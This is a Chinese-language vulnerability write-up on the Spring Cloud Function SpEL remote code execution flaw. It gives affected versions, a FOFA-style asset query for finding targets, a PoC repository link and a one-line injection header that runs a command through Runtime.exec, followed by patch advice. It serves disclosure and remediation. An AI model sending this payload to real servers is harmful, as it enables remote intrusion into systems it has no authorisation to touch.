---
title: Spring_Cloud_Function_SPEL远程代码执行
comments: true
tags:
  - Spring_Cloud_Function_SPEL
  - RCE
categories: cve
keywords: Spring_Cloud_Function_SPEL
top_img: 'https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Spring-1.jpg'
cover: 'https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Spring-1.jpg'
abbrlink: aa56ae7d
date: 2022-03-26 23:33:12
---

# Spring Cloud Function SPEL 远程命令执行漏洞

## 遵纪守法

任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益

## 漏洞描述

Spring Cloud Function 是基于Spring Boot 的函数计算框架，通过对传输细节和基础架构进行抽象，为开发人员保留熟悉的开发工具和开发流程，使开发人员专注在实现业务逻辑上，从而提升开发效率。

访问Spring Cloud Function的 HTTP请求头中存在 spring.cloud.function.routing-expression参数，其 SpEL表达式可进行注入攻击，并通过 StandardEvaluationContext解析执行。最终，攻击者可通过该漏洞进行远程命令执行。

## 风险等级

高

## 影响版本

```
3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2  
```

注：部分版本进行特定配置的动态路才会受该漏洞影响！

## 资产确定

```
app="vmware-SpringBoot-framework“
```

## 漏洞复现

**POC**

https://github.com/hktalent/spring-spel-0day-poc

```
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("calc")
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Spring-1.jpg)

## 修复建议

目前Spring Cloud官方已经推出补丁修复漏洞，受影响用户可以通过官方补丁进行修复。

官方链接：

https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
